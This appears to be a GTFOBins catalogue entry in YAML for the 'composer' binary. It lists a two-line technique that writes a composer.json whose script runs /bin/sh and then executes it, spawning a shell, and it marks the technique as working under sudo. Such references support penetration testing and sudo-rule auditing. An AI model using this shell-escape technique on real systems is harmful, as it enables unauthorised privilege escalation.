<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/composer -->
---
functions:
  shell:
  - code: |-
      echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
      composer run-script x
    contexts:
      sudo:
      unprivileged:
...
